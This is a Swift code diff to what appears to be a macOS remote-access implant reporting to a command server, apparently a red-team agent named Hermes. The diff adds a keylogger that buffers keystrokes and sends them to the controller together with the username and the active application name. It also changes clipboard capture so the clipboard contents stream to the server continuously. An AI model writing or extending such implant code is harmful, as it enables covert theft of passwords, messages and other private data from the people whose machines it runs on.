@@ -6,6 +6,7 @@
 //
 
 import Foundation
+import Cocoa
 
 class Job {
     var jobID: Int
@@ -39,9 +40,9 @@ class Job {
     // screenshot
     var screenshotTotalDisplays: Int
     var screenshotDisplayNumber: Int
-    
-    
-    
+    // keylog
+    var keylogBuffer: String
+
     init() {
         self.jobID = 0
         self.taskID = ""
@@ -68,8 +69,13 @@ class Job {
         self.uploadData = ""
         self.screenshotTotalDisplays = 0
         self.screenshotDisplayNumber = 0
+        self.keylogBuffer = ""
     }
 }
+
+var capslock = false
+var keylogBuffer = ""
+var activeApp = ""
 
 class JobList {
     var jobCount = 0
@@ -187,7 +193,9 @@ func executeTask(job: Job, jobList: JobList) {
             upload(job: job)
         }
     case "clipboard":
-        clipboard(job: job)
+        if job.status == "" {
+            clipboard(job: job)
+        }
     case "screenshot":
         // Gather total number of displays to download
         if job.screenshotTotalDisplays == 0 {
@@ -213,6 +221,11 @@ func executeTask(job: Job, jobList: JobList) {
         }
     case "mkdir":
         makeDirectory(job: job)
+    case "keylog":
+        if job.status != "keylog_started" {
+            let swiftSpy = SwiftSpy()
+            swiftSpy.keylog(job: job)
+        }
     default:
         job.result = "Command not implemented."
         job.status = "error"
@@ -315,13 +328,37 @@ func postResponse(jobList: JobList) {
                 job.downloadChunkNumber = job.downloadChunkNumber + 1
             }
         }
+        
+        // Handle keylog jobs
+        if job.command == "keylog" {
+            job.keylogBuffer += keylogBuffer
+            keylogBuffer = ""
+            let jsonResponse = JSON([
+                "task_id": job.taskID,
+                "user": NSUserName(),
+                "window_title": NSWorkspace.shared.frontmostApplication?.localizedName,
+                "keystrokes": job.keylogBuffer,
+            ])
+            job.keylogBuffer = ""
+            jsonJobOutput.append(jsonResponse)
+        }
+        
+        // Continuously stream clipboard data
+        if job.command == "clipboard" {
+            let jsonResponse = JSON([
+                "task_id": job.taskID,
+                "user_output": job.result,
+            ])
+            job.result = ""
+            jsonJobOutput.append(jsonResponse)
+        }
     }
     
     let jsonPayload = JSON([
         "action": "post_response",
         "responses": jsonJobOutput,
     ])
-    //print("HERMES_POST_RESPONSE", jsonPayload)
+    print("HERMES_POST_RESPONSE", jsonPayload)
     // Decode negotiated b64 session key from agent config
     let sessionKey = fromBase64(data: agentConfig.encodedAESKey)
     
@@ -339,7 +376,7 @@ func postResponse(jobList: JobList) {
                 // Found a job that succeeded and matched with task_id
                 if responses["task_id"].stringValue == job.taskID {
                     // Delete job if it is a "normal" job
-                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot")) {
+                    if ((job.command != "download") && (job.command != "upload") && (job.command != "screenshot") && (job.command != "keylog") && (job.command != "clipboard")) {
                         jobList.jobs.remove(at: index)
                         print("job removed")
                     }
